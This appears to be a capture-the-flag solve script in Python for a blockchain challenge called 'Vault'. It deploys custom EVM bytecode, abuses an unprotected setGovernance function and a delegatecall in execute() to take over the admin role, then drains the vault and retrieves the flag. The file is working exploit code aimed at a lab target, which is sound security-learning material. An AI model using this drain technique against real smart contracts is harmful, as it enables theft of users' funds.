#!/usr/bin/env python3
"""
EHAXctf - Vault (Blockchain)
Drain the vault via delegatecall + no-auth setGovernance
"""
from web3 import Web3
from eth_account import Account
import socket, re, time

# Connect and keep socket alive
print("[*] Connecting...")
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(30)
sock.connect(("135.235.193.111", 1337))
time.sleep(3)
data = b''
while True:
    try:
        chunk = sock.recv(4096)
        if not chunk: break
        data += chunk
    except: break

banner = data.decode()
RPC_URL = re.search(r'RPC URL\s*:\s*(http://\S+)', banner).group(1)
VAULT_ADDR = re.search(r'Vault\s*:\s*(0x\S+)', banner).group(1)
PLAYER_KEY = re.search(r'Private Key:\s*(0x\S+)', banner).group(1)
print(f"[*] RPC: {RPC_URL}")

w3 = Web3(Web3.HTTPProvider(RPC_URL))
assert w3.is_connected()
player = Account.from_key(PLAYER_KEY)
print(f"[*] Player: {player.address}")
chain_id = w3.eth.chain_id
nonce = w3.eth.get_transaction_count(player.address)

vault_abi = [
    {"inputs":[],"name":"paused","outputs":[{"type":"bool"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"admin","outputs":[{"type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"governance","outputs":[{"type":"address"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"getBalance","outputs":[{"type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"isSolved","outputs":[{"type":"bool"}],"stateMutability":"view","type":"function"},
    {"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"data","type":"bytes"}],"name":"execute","outputs":[],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"_g","type":"address"}],"name":"setGovernance","outputs":[],"stateMutability":"nonpayable","type":"function"},
]
vault = w3.eth.contract(address=VAULT_ADDR, abi=vault_abi)

print(f"[*] Balance: {Web3.from_wei(w3.eth.get_balance(VAULT_ADDR), 'ether')} ETH")
print(f"[*] Paused: {vault.functions.paused().call()}")
print(f"[*] Admin: {vault.functions.admin().call()}")

def send_raw(data_hex, to=None, value=0):
    global nonce
    tx = {
        'nonce': nonce,
        'to': to,
        'value': value,
        'gas': 3000000,
        'gasPrice': w3.eth.gas_price,
        'chainId': chain_id,
        'data': data_hex,
    }
    signed = player.sign_transaction(tx)
    tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    nonce += 1
    return receipt

# ===== EXPLOIT =====

# Deploy malicious contract:
# Runtime: PUSH1 0 PUSH1 0 SSTORE  CALLER PUSH1 1 SSTORE  STOP
# sstore(0, 0) -> paused=false ; sstore(1, caller) -> admin=player
runtime_hex = "60006000553360015500"
# Constructor: copy runtime to memory, return it
# Total constructor = 11 bytes (offset 0x0b)
ctor_hex = f"60{len(bytes.fromhex(runtime_hex)):02x}80600b600039600bf3"
# Wait, return size should be runtime_len not 0x0b
runtime_len = len(bytes.fromhex(runtime_hex))
# PUSH1 rlen, DUP1, PUSH1 0x0b, PUSH1 0x00, CODECOPY, PUSH1 0x00, RETURN
# But RETURN takes (offset, length). Stack after CODECOPY: [rlen] (from DUP1 leftover? No.)
# Let me be precise:
# PUSH1 rlen     -> [rlen]
# DUP1           -> [rlen, rlen]
# PUSH1 11       -> [11, rlen, rlen]
# PUSH1 0        -> [0, 11, rlen, rlen]
# CODECOPY       -> pops (destOffset=0, offset=11, length=rlen) -> [] ... wait no: [rlen]
# Actually CODECOPY pops 3 values. Stack before CODECOPY: [0, 11, rlen, rlen]
# CODECOPY pops: destOffset=0 (top), offset=11, size=rlen -> stack: [rlen]
# PUSH1 0        -> [0, rlen]
# RETURN         -> returns memory[0:rlen] ✓
ctor = bytes([
    0x60, runtime_len,  # PUSH1 rlen
    0x80,               # DUP1
    0x60, 0x0b,         # PUSH1 11 (constructor size)
    0x60, 0x00,         # PUSH1 0
    0x39,               # CODECOPY
    0x60, 0x00,         # PUSH1 0
    0xf3,               # RETURN
])
assert len(ctor) == 11
deploy_data = '0x' + ctor.hex() + runtime_hex

print(f"\n[1] Deploy evil contract...")
r = send_raw(deploy_data)
evil = r.contractAddress
print(f"    Deployed: {evil} (status={r.status})")

# Verify code exists
code = w3.eth.get_code(evil)
print(f"    Runtime code: {code.hex()}")
print(f"    Expected:     {runtime_hex}")

# setGovernance(evil) - NO ACCESS CONTROL!
print(f"\n[2] setGovernance({evil})...")
set_gov_data = vault.functions.setGovernance(evil).build_transaction({
    'from': player.address, 'nonce': nonce, 'gas': 500000, 'gasPrice': w3.eth.gas_price, 'chainId': chain_id
})
r = send_raw(set_gov_data['data'], to=VAULT_ADDR)
print(f"    Done (status={r.status})")
print(f"    Governance: {vault.functions.governance().call()}")

# execute(data) -> delegatecall to evil -> sstore(0,0) + sstore(1,caller)
print(f"\n[3] execute() delegatecall...")
# Encode execute(bytes) call - pass empty bytes to trigger our runtime
exec_data = vault.functions.execute(b'').build_transaction({
    'from': player.address, 'nonce': nonce, 'gas': 3000000, 'gasPrice': w3.eth.gas_price, 'chainId': chain_id
})
try:
    r = send_raw(exec_data['data'], to=VAULT_ADDR)
    print(f"    Done (status={r.status})")
except Exception as e:
    print(f"    Error: {e}")
    # Try static call to debug
    try:
        vault.functions.execute(b'').call({'from': player.address})
    except Exception as e2:
        print(f"    Static call error: {e2}")

print(f"    Paused: {vault.functions.paused().call()}")
print(f"    Admin: {vault.functions.admin().call()}")

# withdraw()
print(f"\n[4] withdraw()...")
bal = w3.eth.get_balance(VAULT_ADDR)
print(f"    Vault balance: {bal}")
if bal > 0 and vault.functions.admin().call().lower() == player.address.lower():
    wd = vault.functions.withdraw().build_transaction({
        'from': player.address, 'nonce': nonce, 'gas': 500000, 'gasPrice': w3.eth.gas_price, 'chainId': chain_id
    })
    r = send_raw(wd['data'], to=VAULT_ADDR)
    print(f"    Withdraw (status={r.status})")

print(f"\n=== Result ===")
print(f"Balance: {w3.eth.get_balance(VAULT_ADDR)} wei")
solved = vault.functions.isSolved().call()
print(f"Solved: {solved}")

if solved:
    print("\n[*] Checking flag...")
    sock.send(b"1\n")
    time.sleep(2)
    flag_data = sock.recv(4096).decode()
    print(flag_data)

sock.close()
